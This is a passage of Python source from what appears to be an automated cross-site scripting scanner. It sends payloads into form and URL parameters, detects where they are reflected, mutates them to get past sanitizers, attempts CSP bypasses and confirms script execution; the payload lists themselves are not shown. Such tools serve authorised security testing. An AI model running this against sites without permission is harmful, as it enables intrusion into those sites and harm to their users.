            reflected = contains_unescaped(rendered, p)
            if not reflected:
                continue

            target_url = getattr(resp, "url", url_csp)
            executed = confirm_execution(target_url)
            if executed:
                _progress_newline()
                console.print(
                    Panel(
                        f"URL: {target_url}\nParam: {name}\nPayload: {p}",
                        title="[green]CSP-Aware XSS (Executed)[/green]",
                    )
                )
                self.vulns.append(
                    self._classify(
                        {"url": target_url, "param": name, "payload": p, "type": "csp_bypass"},
                        executed=True,
                    )
                )
                return True
        return False

    def _phase_probe_progressive(self, url, method, name, template, is_form, probe, request_meta=None):
        tpl = dict(template)
        tpl[name] = probe
        req, extra_headers, body = prepare_request_args(url, method, tpl, is_form, request_meta=request_meta)
        if method == "GET" and not is_form:
            resp = make_request(req, headers=extra_headers or None)
        else:
            headers = dict(extra_headers or {}) if extra_headers else {}
            data = body
            if method == "POST" and not is_form:
                headers.setdefault("Content-Type", "application/json")
                data = json.dumps(body) if isinstance(body, dict) else body
            headers, data = apply_csrf(req, method, data if isinstance(data, dict) else {}, headers)
            resp = make_request(req, method, data=data, headers=headers or None)
        html0 = resp.text if resp else ""
        if not contains_unescaped(html0, probe) and not contains_unescaped((fetch_dynamic_html(req) or ""), probe):
            logger.info(f"[probe] no reflection for {name}")
            return False

        csp_header = ""
        try:
            if resp and getattr(resp, "headers", None):
                csp_header = resp.headers.get("Content-Security-Policy", "") or ""
        except Exception:
            csp_header = ""

        return self._probe_and_bypass(url, method, name, template, is_form, html0, probe, csp_header, request_meta=request_meta)

    def _probe_and_bypass(self, url, method, name, template, is_form, raw_html, probe, csp_header: str = "", request_meta=None):
        try:
            prof = self.engine.analyze_sanitization(raw_html or "", probe or "")
            if (csp_header or "").strip():
                from utils import derive_csp_flags

                prof.csp_flags = derive_csp_flags(parse_csp(csp_header))
            seq = self.engine.generate_sequence(prof)
            total = len(seq)
        except Exception:
            total = 300
        t0 = time.time()

        def _cb(idx: int):
            try:
                _print_progress(f"[probe] {idx}/{total} ETA={_fmt_eta(total, idx, t0)}")
            except Exception:
                pass

        result = self.engine.test_progressive(
            url, method, name, template, is_form, raw_html, probe, progress_cb=_cb, request_meta=request_meta
        )
        if not result:
            return False

        final = result["url"]
        param = result.get("parameter", name)
        resp = make_request(final)
        rendered = fetch_dynamic_html(final) or (resp.text if resp else raw_html)

        if contains_unescaped(rendered, result["payload"]):
            executed = confirm_execution(final)
            title = "[HIGH] Executable XSS" if executed else "[INFO] Reflected (Unescaped)"
            _progress_newline()
            console.print(Panel(f"URL: {final}\nParam: {param}\nPayload: {result['payload']}", title=title))
            self.vulns.append(
                self._classify(
                    {"url": final, "param": param, "payload": result["payload"], "type": "executed" if executed else "reflected"},
                    executed=executed,
                )
            )
            return True

        logger.info(f"[bypass-false] {result['payload']}")
        return False

    def _phase_coverage(self, url, method, name, template, is_form, raw_html, probe, request_meta=None):
        try:
            baseline = run_with_coverage(url, "")
        except Exception:
            baseline = 0

        candidates = self.payloads.get("polyglot", []) + self.payloads.get("html_tag_injection", [])
        scored = []
        total = len(candidates)
        i = 0
        t0 = time.time()
        _print_progress(f"[coverage] scored=0/{total} ETA={_fmt_eta(total, 0, t0)}")
        for p in candidates:
            try:
                cov = run_with_coverage(url, f"document.body.insertAdjacentHTML('beforeend', `{p}`);")
                scored.append((cov - baseline, p))
            except Exception:
                continue
            finally:
                i += 1
                if i % self.progress_every == 0:
                    _print_progress(f"[coverage] scored={i}/{total} ETA={_fmt_eta(total, i, t0)}")

        scored.sort(reverse=True, key=lambda x: x[0])
        for j, (_, p) in enumerate(scored[:5], start=1):
            tpl = dict(template)
            tpl[name] = p
            req3, extra_headers3, body3 = prepare_request_args(url, method, tpl, is_form, request_meta=request_meta)
            if method == "GET" and not is_form:
                resp3 = make_request(req3, headers=extra_headers3 or None)
            else:
                headers = dict(extra_headers3 or {}) if extra_headers3 else {}
                data = body3
                if method == "POST" and not is_form:
                    headers.setdefault("Content-Type", "application/json")
                    data = json.dumps(body3) if isinstance(body3, dict) else body3
                headers, data = apply_csrf(req3, method, data if isinstance(data, dict) else {}, headers)
                resp3 = make_request(req3, method, data=data, headers=headers or None)
            _print_progress(f"[coverage] test_top={j}/5 | {name}@{_short_url(req3)} | pl: {_preview_payload(p)}")
            if resp3 and contains_unescaped(resp3.text, p):
                _progress_newline()
                console.print(Panel(f"URL: {resp3.url}\nParam: {name}\nPayload: {p}", title="[green]Coverage-Guided XSS[/green]"))
                self.vulns.append(self._classify({"url": resp3.url, "param": name, "payload": p, "type": "coverage"}))
                return True
        return False

    def _run_static_tests(self, url, method, name, template, is_form, contexts, sanitizer_map, request_meta=None):
        futures = []
        total = 0
        t0 = time.time()
        found = 0
        flags = getattr(self, "_filter_profile_flags", {}) or {}
        allow_html = flags.get("allow_html", True)
        allow_attr = flags.get("allow_attr", True)
        allow_event = flags.get("allow_event", True)
        allow_url = flags.get("allow_url_scheme", True)
        allow_js = flags.get("allow_js_string", True)
        attr_ctx = {"attr_quoted", "attr_unquoted", "data_attribute", "srcdoc_attr"}
        html_ctx = {"html_tag", "script_tag", "template_engine"}
        for ctx in contexts or ["html_tag"]:
            if not allow_html and (ctx in html_ctx or ctx == "polyglot"):
                continue
            if not allow_attr and ctx in attr_ctx:
                continue
            if not allow_event and ctx == "event_handler":
                continue
            if not allow_url and ctx == "uri_scheme":
                continue
            if not allow_js and ctx == "js_string":
                continue
            for cat in CONTEXT_TO_PAYLOADS.get(ctx, []):
                for payload in self.payloads.get(cat, []):
                    if not filter_payload_by_sanitizer(payload, sanitizer_map):
                        continue
                    mutated = mutate_payload_by_sanitizer(payload, sanitizer_map)
                    for pl in (payload, mutated):
                        futures.append(
                            self._executor.submit(
                                self._static_worker,
                                url,
                                method,
                                name,
                                template,
                                is_form,
                                pl,
                                cat,
                                request_meta,
                            )
                        )
                        total += 1

        if not futures:
            return

        done = 0
        for f in as_completed(futures):
            res = f.result()
            done += 1
            if res:
                found += 1
            if done % self.progress_every == 0 or res:
                _print_progress(
                    f"[static] tested {done}/{total} hits={found} ETA={_fmt_eta(total, done, t0)} | {name}@{_short_url(url)}"
                )
            if res:
                try:
                    res["sinks"] = _sink_location_labels(contexts)
                except Exception:
                    res["sinks"] = []
                sev = get_xss_severity(contexts, res["payload"], res["response_text"])
                note = "[yellow]Mutated due to filter[/yellow]\n" if res["mutated"] else ""
                _progress_newline()
                console.print(
                    Panel(
                        f"{note}{sev}\nURL: {res['url']}\nParam: {res['param']}\nPayload: {res['payload']}",
                        title="[red]Static XSS Detected[/red]",
                    )
                )
                self.vulns.append(self._classify(res))
                return

    def _static_worker(self, url, method, name, template, is_form, payload, category, request_meta=None):
        tpl = dict(template)
        tpl[name] = payload
        req, extra_headers, body = prepare_request_args(url, method, tpl, is_form, request_meta=request_meta)
        try:
            if method == "GET" and not is_form:
                resp = make_request(req, headers=extra_headers or None)
            else:
                headers = dict(extra_headers or {}) if extra_headers else {}
                data = body
                if method == "POST" and not is_form:
                    headers.setdefault("Content-Type", "application/json")
                    data = json.dumps(body) if isinstance(body, dict) else body
                headers, data = apply_csrf(req, method, data if isinstance(data, dict) else {}, headers)
                resp = make_request(req, method, data=data, headers=headers or None)
        except Exception as e:
            logger.debug(f"static test error: {e}")
            return None
        if resp and contains_unescaped(resp.text, payload):
            return {
                "url": resp.url,
                "param": name,
                "payload": payload,
                "response_text": resp.text,
                "type": f"static_{category}",
                "mutated": payload not in self.payloads.get(category, []),
            }
        return None

    def _get_rendered_html(self, url, method, name, template, is_form, probe, request_meta=None):
        tpl = dict(template)
        tpl[name] = probe
        req, extra_headers, body = prepare_request_args(url, method, tpl, is_form, request_meta=request_meta)
        if method == "GET" and not is_form:
            return fetch_dynamic_html(req) or ""
        if method == "GET" and not is_form:
            resp = make_request(req, headers=extra_headers or None)
        else:
            headers = dict(extra_headers or {}) if extra_headers else {}
            data = body
            if method == "POST" and not is_form:
                headers.setdefault("Content-Type", "application/json")
                data = json.dumps(body) if isinstance(body, dict) else body
            resp = make_request(req, method, data=data, headers=headers or None)
        return resp.text if resp else ""

    def _detect_contexts(self, html_content: str, probe: str):
        if not html_content:
            return []
        unesc = decode_all(html_content)
        esc = re.escape(probe)
        rules = {
            "html_tag": rf">{esc}<",
            "script_tag": rf"<script\b[^>]*>[^<]*{esc}[^<]*</script>",
            "attr_unquoted": rf"\b[\w-]+\s*=\s*{esc}(?=[\s>])",
            "attr_quoted": rf'\b[\w-]+\s*=\s*([\'"]){esc}\1',
            "js_string": rf'([\'"]){esc}\1',
            "uri_scheme": rf"(javascript|data|vbscript)\s*:\s*{esc}",
            "css_url": rf"url\([^)]*{esc}[^)]*\)",
            "polyglot": rf"(['\"`]).*{esc}.*\1",
            "event_handler": rf"\bon[a-z]+\s*=\s*(['\"])?{esc}\1?",
            "css_expression": rf"expression\([^)]*{esc}[^)]*\)",
            "template_literal": rf"`[^`]*{esc}[^`]*`",
            "tag_comment": rf"<!--[^>]*{esc}[^>]*-->",
            "data_attribute": rf"\bdata-[\w-]+\s*=\s*(['\"])?{esc}\1?",
            "srcdoc_attr": rf"\bsrcdoc\s*=\s*(['\"]).*{esc}.*\1",
        }
        ctxs = []
        for name, pat in rules.items():
            if re.search(pat, html_content, re.I | re.S) or re.search(pat, unesc, re.I | re.S):
                ctxs.append(name)
        if probe in (html_content or "") and not ctxs:
            ctxs.append("unknown")
        logger.debug(f"[detect_contexts] probe={probe!r} -> {ctxs}")
        return ctxs

    def _contexts_from_runtime(self, runtime_findings: List[Dict[str, Any]]) -> List[str]:
        contexts: List[str] = []
        if not runtime_findings:
            return contexts

        def _add_ctx(name: str) -> None:
            if name and name not in contexts:
                contexts.append(name)

        skip_exact = {"csp_violation", "csp_flags", "sandbox_iframe", "trustedtypes_policy", "pageerror"}
        skip_prefixes = ("console_",)

        prefix_map = [
            ("dialog_", ["script_tag"]),
            ("innerhtml", ["innerHTML"]),
            ("outerhtml", ["outerHTML"]),
            ("textcontent", ["textContent"]),
            ("innertext", ["innerText"]),
            ("outertext", ["outerText"]),
            ("insertadjacenthtml", ["insertAdjacentHTML"]),
            ("insertadjacenttext", ["insertAdjacentText"]),
            ("insertadjacentelement", ["innerHTML"]),
            ("template_innerhtml", ["innerHTML"]),
            ("element.sethtml", ["innerHTML"]),
            ("element_sethtml", ["innerHTML"]),
            ("document.write", ["innerHTML"]),
            ("document.writeln", ["innerHTML"]),
            ("document_write", ["innerHTML"]),
            ("document_writeln", ["innerHTML"]),
            ("domparser.parsefromstring", ["innerHTML"]),
            ("createcontextualfragment", ["innerHTML"]),
            ("range_insertnode", ["innerHTML"]),
            ("dom_add", ["innerHTML"]),
            ("dom_attr", ["innerHTML"]),
            ("element_append", ["innerHTML"]),
            ("element_prepend", ["innerHTML"]),
            ("element_before", ["innerHTML"]),
            ("element_after", ["innerHTML"]),
            ("element_replacechildren", ["innerHTML"]),
            ("element_replacewith", ["innerHTML"]),
            ("fragment_append", ["innerHTML"]),
            ("fragment_prepend", ["innerHTML"]),
            ("fragment_before", ["innerHTML"]),
            ("fragment_after", ["innerHTML"]),
            ("fragment_replacechildren", ["innerHTML"]),
            ("fragment_replacewith", ["innerHTML"]),
            ("jquery_html", ["innerHTML"]),
            ("jquery_append", ["innerHTML"]),
            ("jquery_prepend", ["innerHTML"]),
            ("jquery_before", ["innerHTML"]),
            ("jquery_after", ["innerHTML"]),
            ("jquery_replacewith", ["innerHTML"]),
            ("eval", ["eval"]),
            ("function", ["Function"]),
            ("settimeout", ["setTimeout-string"]),
            ("setinterval", ["setInterval-string"]),
            ("sanitizer.sanitize_in", ["template_engine"]),
            ("dompurify_in", ["template_engine"]),
            ("dompurify_passed_marker", ["template_engine"]),
            ("input_value", ["attr_quoted"]),
        ]

        nav_prefixes = ("window_open", "xhr_open", "fetch", "sendbeacon", "location_assign", "location_replace")
        css_prefixes = ("css_setproperty", "csstext", "css_insertrule")

        for finding in runtime_findings:
            raw_type = str(finding.get("type") or "")
            if not raw_type:
                continue
            kind = raw_type.lower()
            if kind.startswith("tainted_"):
                kind = kind[8:]
            if kind in skip_exact or any(kind.startswith(prefix) for prefix in skip_prefixes):
                continue

            detail = finding.get("detail")
            detail_str = str(detail) if detail is not None else ""
            detail_lower = detail_str.lower()

            if kind.startswith("event_on"):
                _add_ctx("event_handler")
                attr = kind.split("_", 1)[1] if "_" in kind else ""
                if attr.startswith("on"):
                    _add_ctx(attr)
                continue

            if any(
                kind.startswith(prefix)
                for prefix in ("setattribute_on", "setattributens_on", "setattributenode_on", "addeventlistener_")
            ):
                _add_ctx("event_handler")
                attr = kind.split("_", 1)[1] if "_" in kind else ""
                if attr.startswith("on"):
                    _add_ctx(attr)
                continue

            if any(kind.startswith(prefix) for prefix in nav_prefixes):
                _add_ctx("uri_scheme")
                continue

            if any(kind.startswith(prefix) for prefix in css_prefixes):
                if "url(" in detail_lower:
                    _add_ctx("css_url")
                else:
                    _add_ctx("css_expression")
                continue

            if any(kind.startswith(prefix) for prefix in ("setattribute_", "setattributens_", "setattributenode_")):
                attr = kind.split("_", 1)[1] if "_" in kind else ""
                if attr.startswith("on"):
                    _add_ctx("event_handler")
                    _add_ctx(attr)
                    continue
                if attr.startswith("data"):
                    _add_ctx("data_attribute")
                    _add_ctx("attr_quoted")
                    continue
                if attr == "srcdoc":
                    _add_ctx("srcdoc_attr")
                    continue
                if attr in (
                    "href",
                    "src",
                    "srcset",
                    "action",
                    "formaction",
                    "poster",
                    "xlink:href",
                    "data-src",
                    "data-href",
                    "data-url",
                ):
                    _add_ctx("attr_quoted")
                    _add_ctx("uri_scheme")
                    continue
                if attr == "style":
                    if "url(" in detail_lower:
                        _add_ctx("css_url")
                    else:
                        _add_ctx("css_expression")
                    continue
                if attr:
                    _add_ctx("attr_quoted")
                    if "javascript:" in detail_lower:
                        _add_ctx("uri_scheme")
                    continue

            matched = False
            for prefix, mapped in prefix_map:
                if kind.startswith(prefix):
                    for ctx in mapped:
                        _add_ctx(ctx)
                    matched = True
                    break
            if matched:
                continue

        return contexts
